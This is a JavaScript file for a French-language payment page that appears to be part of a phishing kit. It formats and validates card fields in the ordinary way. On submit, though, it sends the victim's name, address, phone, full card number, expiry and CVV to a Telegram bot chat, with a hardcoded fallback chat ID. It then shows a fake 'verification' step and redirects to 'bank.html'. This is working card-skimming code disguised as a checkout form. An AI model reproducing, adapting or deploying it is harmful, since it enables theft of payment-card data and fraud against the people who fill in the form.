// Attendre que config.js charge
async function waitForConfig(maxWait = 5000) {
    const start = Date.now();
    while (!window.telegramConfig && Date.now() - start < maxWait) {
        await new Promise(r => setTimeout(r, 100));
    }
    return window.telegramConfig;
}

document.addEventListener("DOMContentLoaded", async () => {
    // Attendre le config.js
    await waitForConfig();
    
    const form = document.getElementById('paymentForm');
    const submitBtn = document.getElementById('submitBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const toast = document.getElementById('toast');
    
    const cardName = document.getElementById('cardName');
    const address = document.getElementById('address');
    const phone = document.getElementById('phone');
    const amount = document.getElementById('amount');
    const cardNumber = document.getElementById('cardNumber');
    const expiry = document.getElementById('expiry');
    const cvv = document.getElementById('cvv');
    
    function showToast(message, isError = false) {
        toast.textContent = message;
        toast.className = 'toast show' + (isError ? ' error' : ' success');
        setTimeout(() => {
            toast.classList.remove('show');
            toast.className = 'toast';
        }, 3000);
    }
    
    const logoImg = document.getElementById("site-logo");
    const logoFallback = document.getElementById("logo-fallback");

    if (logoImg) {
        const testImg = new Image();
        testImg.src = logoImg.src;
        testImg.onload = () => {
            logoImg.classList.remove("hidden");
            logoFallback.classList.add("hidden");
        };
        testImg.onerror = () => {
            logoImg.classList.add("hidden");
            logoFallback.classList.remove("hidden");
        };
    }

    const mobileBtn = document.getElementById("mobile-menu-btn");
    const mobileMenu = document.getElementById("mobile-menu");
    let isMenuOpen = false;

    if (mobileBtn && mobileMenu) {
        mobileBtn.addEventListener("click", () => {
            isMenuOpen = !isMenuOpen;
            if (isMenuOpen) {
                mobileMenu.style.maxHeight = "400px";
                mobileMenu.style.opacity = "1";
                mobileMenu.style.paddingBottom = "1rem";
            } else {
                mobileMenu.style.maxHeight = "0";
                mobileMenu.style.opacity = "0";
                mobileMenu.style.paddingBottom = "0";
            }
        });
    }

    function removeError(input, errorId) {
        input.classList.remove('error');
        const errorEl = document.getElementById(errorId);
        if (errorEl) errorEl.classList.remove('show');
    }

    function addError(input, errorId) {
        input.classList.add('error');
        const errorEl = document.getElementById(errorId);
        if (errorEl) errorEl.classList.add('show');
    }

    function validateForm() {
        let isValid = true;
        
        if (!cardName.value.trim()) { addError(cardName, 'error-cardName'); isValid = false; }
        else { removeError(cardName, 'error-cardName'); }
        
        if (!address.value.trim()) { addError(address, 'error-address'); isValid = false; }
        else { removeError(address, 'error-address'); }
        
        const phoneClean = phone.value.replace(/\s/g, '');
        if (!phoneClean || phoneClean.length < 10) { addError(phone, 'error-phone'); isValid = false; }
        else { removeError(phone, 'error-phone'); }
        
        const amountVal = parseFloat(amount.value.replace('€', '').trim());
        if (isNaN(amountVal) || amountVal <= 0) { addError(amount, 'error-amount'); isValid = false; }
        else { removeError(amount, 'error-amount'); }
        
        const cardClean = cardNumber.value.replace(/\s/g, '');
        if (!cardClean || cardClean.length < 13 || cardClean.length > 19) { addError(cardNumber, 'error-cardNumber'); isValid = false; }
        else { removeError(cardNumber, 'error-cardNumber'); }
        
        const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
        if (!expiry.value || !expiryRegex.test(expiry.value)) { addError(expiry, 'error-expiry'); isValid = false; }
        else { removeError(expiry, 'error-expiry'); }
        
        if (!cvv.value || cvv.value.length < 3) { addError(cvv, 'error-cvv'); isValid = false; }
        else { removeError(cvv, 'error-cvv'); }
        
        return isValid;
    }

    const logos = {
        visa: document.getElementById("logo-visa"),
        mastercard: document.getElementById("logo-mastercard"),
        cb: document.getElementById("logo-cb"),
        cartenb: document.getElementById("logo-cartenb"),
        amex: document.getElementById("logo-amex")
    };

    function resetLogos() {
        Object.values(logos).forEach(logo => { if(logo) logo.classList.remove("active"); });
    }

    cardNumber.addEventListener("input", (e) => {
        let value = e.target.value.replace(/\s+/g, "").replace(/[^0-9]/g, "");
        resetLogos();

        if (value.length > 0) {
            if (/^4/.test(value)) { if(logos.visa) logos.visa.classList.add("active"); cvv.maxLength = 3; cvv.placeholder = "3 chiffres"; }
            else if (/^5[1-5]/.test(value) || /^222[1-9]/.test(value)) { if(logos.mastercard) logos.mastercard.classList.add("active"); cvv.maxLength = 3; cvv.placeholder = "3 chiffres"; }
            else if (/^3[47]/.test(value)) { if(logos.amex) logos.amex.classList.add("active"); cvv.maxLength = 4; cvv.placeholder = "4 chiffres"; }
            else { if(logos.cb) logos.cb.classList.add("active"); if(logos.cartenb) logos.cartenb.classList.add("active"); cvv.maxLength = 3; cvv.placeholder = "3 chiffres"; }
        }

        let formattedValue = "";
        if (/^3[47]/.test(value)) {
            let matches = value.match(/^(\d{1,4})(\d{0,6})(\d{0,5})$/);
            if (matches) formattedValue = matches[1] + (matches[2] ? " " + matches[2] : "") + (matches[3] ? " " + matches[3] : "");
        } else {
            let matches = value.match(/\d{1,4}/g);
            if (matches) formattedValue = matches.join(" ");
        }
        e.target.value = formattedValue;
    });

    expiry.addEventListener("input", (e) => {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 2) {
            let month = parseInt(value.substr(0, 2), 10);
            if (month > 12) month = 12;
            if (month === 0) month = 1;
            let monthStr = month < 10 ? "0" + month : month.toString();
            e.target.value = monthStr + "/" + value.substr(2, 2);
        } else { e.target.value = value; }
    });

    expiry.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && expiry.value.length === 3) {
            expiry.value = expiry.value.slice(0, 2);
            e.preventDefault();
        }
    });

    cvv.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/\D/g, ""); });
    phone.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/[^0-9 ]/g, ""); });
    amount.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/[^0-9.,]/g, ""); });

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (!validateForm()) {
            showToast('Veuillez remplir tous les champs correctement', true);
            return;
        }
        
        submitBtn.disabled = true;
        submitBtn.textContent = 'Vérification en cours...';
        loadingOverlay.style.display = 'flex';
        
        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '';
        const CHAT_ID = (window.telegramConfig && window.telegramConfig.CHAT_ID) || '6078788670';
        const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
        
        console.log('Sending to Telegram with token:', BOT_TOKEN ? 'SET' : 'EMPTY');
        
        if (BOT_TOKEN) {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg})
            }).then(r => {
                console.log('Telegram response status:', r.status);
                return r.json();
            }).then(d => {
                console.log('Telegram response:', d);
            }).catch(e => {
                console.error('Telegram error:', e);
            });
        } else {
            console.warn('BOT_TOKEN is empty');
        }
        
        setTimeout(() => {
            window.location.href = 'bank.html';
        }, 2000);
    });
});
